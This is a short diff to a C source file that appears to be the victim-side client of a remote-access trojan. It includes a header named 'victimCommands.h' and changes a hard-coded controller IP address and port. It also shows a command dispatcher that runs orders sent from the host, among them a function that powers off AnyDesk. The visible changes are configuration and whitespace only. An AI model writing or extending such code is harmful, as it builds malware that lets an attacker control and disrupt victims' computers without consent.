@@ -3,8 +3,8 @@
 #include <stdbool.h>
 #include "victimCommands.h"
 
-#define PORT 14576
-#define IP "3.131.207.170"
+#define PORT 11091
+#define IP "52.14.18.129"
 
 // Functions
 void connectToHost();
@@ -81,7 +81,6 @@ void processCommand(int command)
     param 1: the command from the host
     */
 
-
     switch (command)
     {
     case 0:
@@ -97,7 +96,7 @@ void processCommand(int command)
     case 3:
         powerOffAnyDesk();
         break;
-        
+
     default:
         break;
     }
